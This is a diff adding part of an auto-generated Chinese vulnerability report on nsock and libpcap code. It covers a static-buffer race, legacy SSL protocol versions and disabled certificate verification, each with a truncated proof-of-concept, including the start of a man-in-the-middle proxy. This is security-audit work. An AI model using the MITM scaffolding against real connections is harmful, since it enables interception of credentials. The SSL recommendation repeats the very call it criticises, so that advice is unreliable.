+                <p><strong>文件:</strong> nsock/src/netutils.c:117</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static char *get_addr_string(const struct sockaddr_storage *ss, size_t sslen) {
+  static char buffer[PEER_STR_LEN];
+  ...
+  return buffer;
+}</code></pre>
+                <p><strong>数据流:</strong> 多线程同时调用get_addr_string() -> 共享静态缓冲区buffer -> 返回的指针指向可能被覆盖的数据</p>
+                <p><strong>判断理由:</strong> get_addr_string函数使用static局部缓冲区，返回指向该静态缓冲区的指针。在多线程环境中，多个线程同时调用此函数会导致数据竞争，一个线程可能读取到另一个线程写入的数据。此外，调用者使用返回的指针时，后续调用可能覆盖缓冲区内容。get_peeraddr_string和get_localaddr_string都调用了此函数，如果多个IOD同时查询地址信息，会导致数据混乱。</p>
+                <p><strong>影响分析:</strong> 该竞争条件可导致以下影响：
+1. 数据损坏：一个线程读取到另一个线程的地址信息，导致IP地址或端口号错误
+2. 信息泄露：可能将内部网络信息暴露给错误的上下文
+3. 逻辑错误：基于错误地址的连接建立、日志记录或访问控制决策可能失败
+4. 安全绕过：如果地址信息用于认证或授权决策，可能导致安全机制被绕过
+5. 调试困难：由于竞争条件具有时序依赖性，问题难以复现和调试</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-C2651E2C - Static Buffer Race Condition in get_addr_string()
+ * 仅供研究使用 (For Research Purposes Only)
+ *
+ * 编译: gcc -pthread -o poc_race poc_race.c -lnsock
+ * 运行: ./poc_race
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+/* 模拟 nsock 中的 PEER_STR_LEN 定义 */
+#define PEER_STR_LEN 128
+
+/* 模拟 get_addr_string 函数 (与漏洞代码相同模式) */
+static char *get_addr_string(con</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-5FA1C2C9 - 不安全的SSL/TLS协议版本</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libpcap/sslutils.c:68</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>SSL_METHOD const *meth =
+    is_server ? SSLv23_server_method() : SSLv23_client_method();</code></pre>
+                <p><strong>数据流:</strong> ssl_init_once函数中直接使用SSLv23_method()创建SSL上下文，未禁用不安全的SSLv2和SSLv3协议</p>
+                <p><strong>判断理由:</strong> SSLv23_method()默认启用SSLv2和SSLv3协议，这些协议存在已知的安全漏洞（如POODLE攻击）。应使用SSLv23_server_method()/SSLv23_client_method()并配合SSL_CTX_set_options()禁用不安全的协议版本。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者利用不安全的SSLv2和SSLv3协议进行中间人攻击。具体影响包括：1) DROWN攻击：攻击者可以通过SSLv2协议解密TLS连接；2) POODLE攻击：攻击者可以利用SSLv3协议中的填充预言机漏洞解密加密数据；3) 降级攻击：攻击者可以强制客户端降级到不安全的协议版本；4) 敏感信息泄露：包括认证凭证、会话令牌等。CVSS评分约为7.5（高严重性）</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC: 利用不安全的SSL/TLS协议版本漏洞
+漏洞ID: VULN-5FA1C2C9
+目标: libpcap/sslutils.c 中的SSLv23_method()默认启用SSLv2/SSLv3
+
+仅供研究使用 - 仅用于安全评估和漏洞验证
+"""
+
+import socket
+import ssl
+import sys
+import argparse
+
+# 警告信息
+WARNING = """
+[!] 警告: 此PoC仅供安全研究使用
+[!] 仅用于验证漏洞存在性
+[!] 未经授权使用可能违反法律法规
+"""
+
+class SSLProtocolChecker:
+    """SSL/TLS协议版本检查器 - 用于验证漏洞"""
+    
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.results = {}
+    
+    def check_ssl_v2(self):
+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-64B66E4D - 缺少证书验证</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libpcap/sslutils.c:103</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);</code></pre>
+                <p><strong>数据流:</strong> 当未设置ssl_rootfile时，客户端模式将验证模式设置为SSL_VERIFY_NONE</p>
+                <p><strong>判断理由:</strong> SSL_VERIFY_NONE会完全禁用服务器证书验证，使客户端容易受到中间人攻击。即使没有CA文件，也应至少进行证书链的基本验证。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者完全绕过SSL/TLS证书验证，实施中间人攻击。攻击者可以：1) 截获所有明文通信内容（包括密码、令牌等敏感信息）；2) 篡改传输中的数据；3) 注入恶意内容；4) 窃取会话凭证。由于libpcap是广泛使用的网络抓包库，许多网络监控工具和安全产品可能受到影响。攻击者无需破解任何加密算法，只需在网络路径上即可实施攻击。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC代码 - 仅供安全研究使用
+漏洞: libpcap SSL客户端缺少证书验证 (VULN-64B66E4D)
+"""
+
+import socket
+import ssl
+import sys
+import argparse
+
+class MITM_Proxy:
+    """模拟中间人攻击服务器，用于演示漏洞"""
+    
+    def __init__(self, listen_host='0.0.0.0', listen_port=4433):
+        self.listen_host = listen_host
+        self.listen_port = listen_port
+        # 使用自签名证书（攻击者控制的证书）
+        self.certfile = 'attacker_cert.pem'
+        self.keyfile = 'attacker_key.pem'
+        
+    def generate_attacker_cert(self):
+  </code></pre></details>
+            </div>
+
+    <hr>
+    <p style="color:#666;font-size:0.9em;">报告由 CodeSentinel 自动生成 | 2026-07-06 23:10:03</p>
+</div>
+</body>
+</html>
